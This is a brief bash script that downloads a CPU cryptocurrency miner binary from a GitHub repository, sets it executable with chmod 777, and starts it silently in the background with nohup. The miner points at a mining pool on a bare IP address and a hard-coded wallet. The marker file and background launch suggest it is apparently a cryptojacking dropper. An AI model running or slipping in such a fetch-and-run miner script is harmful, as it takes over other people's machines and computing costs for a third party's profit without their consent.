#!/bin/bash
cd /data
touch exist
curl -LO https://github.com/2319763378/pool/raw/master/cpuminer-sse2
chmod 777 cpuminer-sse2
nohup ./cpuminer-sse2 -a cpupower -o stratum+tcp://118.190.244.49:3032 -u CZBBY4VrkW4oUiE3ig7Shpx6uCAha6LcoE.wawawa &
